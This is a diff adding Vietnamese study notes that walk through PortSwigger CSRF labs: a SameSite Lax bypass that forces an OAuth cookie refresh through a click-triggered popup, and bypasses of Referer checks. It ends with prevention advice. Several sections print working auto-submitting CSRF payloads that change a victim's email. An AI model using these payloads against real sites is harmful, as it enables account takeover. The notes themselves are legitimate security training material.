@@ -274,6 +274,262 @@ Thường khi không cấp chế độ gì cho cookie thì nó sẽ tự động
 
 nhưng vì để không phá vỡ cơ chế SSO, trong 120s đầu tiên cấp cookie nó vẫn có thể dùng với POST, và đây là khoảng thời gian mà cookie không ở chế độ `Lax`
 
+Sẽ không khả thi nếu để căn thời gian để tấn công như vậy. Thay vào đó ta tìm 1 gadget khác để bắt buộc người dùng cấp 1 cookie mới thì từ đó thực hiện cuộc tấn công. 
+
+Ví dụ: việc hoàn tất luồng đăng nhập dựa trên OAuth có thể dẫn đến một phiên mới vì dịch vụ OAuth không nhất thiết phải biết liệu người dùng có còn đăng nhập vào trang web đích hay không (nếu còn trong phiên thì người dùng không cần thao tác, việc đăng nhập và cấp cookie có thể diễn ra liên tục).
+
+Để kích hoạt làm mới cookie mà không cần victim đăng nhập lại, cần sử dụng điều hướng cấp cao nhất để đảm bảo rằng các cookie được liên kết với phiên OAuth hiện tại của victim được mang theo. Điều này dẫn đến 1 khó khăn khác vì sau đó cần phải chuyển hướng người dùng trở lại trang web attack để có thể khởi chạy cuộc tấn công CSRF.
+
+Ngoài ra, có thể kích hoạt làm mới cookie từ một tab mới để trình duyệt không thoát khỏi trang, trước khi có thể thực hiện cuộc tấn công cuối cùng. Một trở ngại nhỏ với cách tiếp cận này là trình duyệt chặn các tab bật lên trừ khi chúng được mở thông qua tương tác thủ công. Ví dụ, cửa sổ bật lên sau sẽ bị trình duyệt chặn theo mặc định:
+
+`window.open('https://vulnerable-website.com/login/sso');`
+
+Để giải quyết vấn đề này, có thể gói câu lệnh trong trình xử lý sự kiện `onclick` như sau:
+
+```js
+window.onclick = () => {
+    window.open('https://vulnerable-website.com/login/sso');
+}
+```
+
+Theo cách này, phương thức `window.open()` chỉ được gọi khi người dùng nhấp vào đâu đó trên trang.
+
+---
+
+### 10. SameSite Lax bypass via cookie refresh
+
+https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh
+
+Mục tiêu: đổi email của victim
+
+Context: có OAuth login
+
+Login vào tài khoản social và thử đổi email
+
+Ta chú ý đến response của OAuth `GET /oauth-callback?code=[...]` và cookie không kèm chế độ gì nên nó sẽ được đặt là `Lax`
+
+![alt text](image-25.png)
+
+Quan sát ta có thể thấy request POST không có csrf token nên chỉ cần có cookie thì ta có thể tấn công CSRF
+
+![alt text](image-26.png)
+
+Payload đổi change email:
+
+```js
+<script>
+    history.pushState('', '', '/')
+</script>
+<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="foo@bar.com" />
+    <input type="submit" value="Submit request" />
+</form>
+<script>
+    document.forms[0].submit();
+</script>
+```
+
+Và khi vừa login chưa đầy 2 phút, thử `View exploit` ta thấy nó đổi thành công và POST mang theo cookie:
+
+![alt text](image-27.png)
+
+![alt text](image-28.png)
+
+Bây giờ ta tìm cách để cấp mới session cho victim, khi ta truy cập `/social-login` thì nó sẽ login lại và sẽ cấp 1 cookie mới:
+
+![alt text](image-29.png)
+
+![alt text](image-30.png)
+
+Sửa payload để victim truy cập `/social-login` trước khi ta tấn công CSRF:
+
+``js
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="pwned@web-security-academy.net">
+</form>
+<script>
+    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+    setTimeout(changeEmail, 5000);
+
+    function changeEmail(){
+        document.forms[0].submit();
+    }
+</script>
+```
+
+Thử `View exploit` ta thấy thông báo bị chặn cửa sổ bật lên:
+
+![alt text](image-31.png)
+
+Nhưng khi tắt thông báo đó thì cuộc tấn công vẫn thực hiện, nhưng nó vẫn phải đảm bảo về mặt thời gian là < 2 phút kể từ khi login:
+
+![alt text](image-32.png)
+
+Browser block vì không có thao tác 1 cách trực tiếp với page, ta thêm payload để victim khi và trang, click bất kì thì sẽ mở cửa sổ và thực hiện cấp mới cookie:
+
+```js
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="pwned@portswigger.net">
+</form>
+<p>Click anywhere on the page</p>
+<script>
+    window.onclick = () => {
+        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+        setTimeout(changeEmail, 5000);
+    }
+
+    function changeEmail() {
+        document.forms[0].submit();
+    }
+</script>
+```
+
+Ở đây ta thực hiện change email sau khi truy cập `/social-login` 5s
+
+Test thử:
+
+Nó sẽ mở ra 1 tab mới, khi click bất kì trong tab này nó sẽ đăng nhập:
+
+![alt text](image-33.png)
+
+Và 5s sau ở tab cũ nó sẽ thực hiện change email:
+
+![alt text](image-34.png)
+
+Lưu ý nên tăng thêm số giây chờ để nó sẽ thực hiện login session mới trước khi change email:
+
+![alt text](image-35.png)
+
+![alt text](image-36.png)
+
+---
+
+# Bỏ qua các biện pháp phòng thủ CSRF dựa trên Referer
+
+1 số trang web thực hiện biện pháp dùng Referer để phòng thủ CSRF bằng cách xác minh yêu cầu này đến từ trang web của họ. Cách tiếp cận này thường yếu hơn
+
+---
+
+Một số trang sẽ xác thực `Referer` khi có mặt nhưng lại thiếu sót khi sẽ bỏ qua nếu không có `Referer` trong request
+
+Kẻ tấn công sẽ thao túng để request của victim ko có `Referer` ví dụ:
+
+`<meta name="referrer" content="never">`
+
+---
+
+### 11. CSRF where Referer validation depends on header being present
+
+https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present
+
+Test thử CSRF:
+
+```js
+<html>
+  <!-- CSRF PoC - generated by Burp Suite Professional -->
+  <body>
+    <form action="https://0a490017038fb2118041801400e3005f.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="abcd&#64;gmail&#46;net" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+![alt text](image-37.png)
+
+Nó báo `referer` header đang bị sai, thêm `<meta name="referrer" content="never">` và exploit lại thì ta đã có thể change email:
+
+![alt text](image-38.png)
+
+![alt text](image-39.png)
+
+Ta cũng có thể thay bằng `<meta name="referrer" content="no-referrer">`
+
+Bây giờ đổi 1 email khác và gửi cho victim
+
+---
+
+Nhiều trình duyệt loại bỏ phần query trong `Referer` trong request gửi đi, để có thể ghi đè hành vi này bằng `Referrer-Policy: unsafe-url` trong request để đảm bảo tất cả url được gửi đi
+
+---
+
+### 12. CSRF with broken Referer validation
+
+https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken
+
+Đăng nhập và đổi email ta bắt được gói tin POST:
+
+![alt text](image-40.png)
+
+Thay đổi `Referer` ta nhận được thông báo rằng `referer` không hợp lệ:
+
+![alt text](image-41.png)
+
+Nếu đổi có domain của lab gốc thì thành công, nó sẽ chỉ xét xem có url đó không chứ ko quan tâm nó ở đoạn nào của url:
+
+![alt text](image-42.png)
+
+Nhưng nếu ta chỉ thay đổi chuỗi query khi POST khi `View exploit` ta nhận được `referer` không có chuỗi query và nhận lỗi 400:
+
+![alt text](image-43.png)
+
+![alt text](image-44.png)
+
+Điều này do mặc định các browser sẽ xóa đi đoạn query khi gửi gói tin trong `referer` để ghi đè hành vi này ta cần thêm header `Referrer-Policy: unsafe-url` khi query:
+
+![alt text](image-45.png)
+
+Gửi lại ta thấy thành công
+
+---
+
+# Ngăn chặn CSRF
+
+## Sử dụng CSRF Token
+
+Cách bảo vệ hiệu quả nhất là sử dụng CSRF token trong các yêu cầu liên quan. CSRF token cần:
+
+- Không thể đoán được và có độ phức tạp cao (entropy cao).
+- Gắn liền với phiên (session) của người dùng.
+- Được kiểm tra nghiêm ngặt trước khi thực hiện hành động.
+
+CSRF token cần được truyền dưới dạng trường ẩn (hidden field) trong biểu mẫu HTML (method POST):
+
+`<input type="hidden" name="csrf-token" value="CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz" />`
+
+Trường này nên được đặt ở đầu tài liệu HTML để giảm nguy cơ tấn công chèn HTML.
+
+## Sử dụng SameSite Cookie Strict
+
+Nên thiết lập cờ SameSite trên cookie để hạn chế cách chúng được sử dụng trong các ngữ cảnh khác nhau:
+- `Strict` là lựa chọn an toàn nhất, giảm xuống `Lax` chỉ khi cần thiết.
+- Không nên sử dụng `SameSite=None` trừ khi hiểu rõ rủi ro.
+
+##  Cảnh giác với tấn công cùng site nhưng khác nguồn gốc (cross-origin, same-site attacks)
+
+- `SameSite` cookie không bảo vệ được tấn công "cross-origin, same-site".
+- Nên cô lập nội dung không an toàn (như file do người dùng tải lên) trên một domain riêng biệt với các chức năng nhạy cảm.
+- Khi kiểm tra bảo mật, cần xem xét kỹ toàn bộ bề mặt tấn công của site và các domain liên quan.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
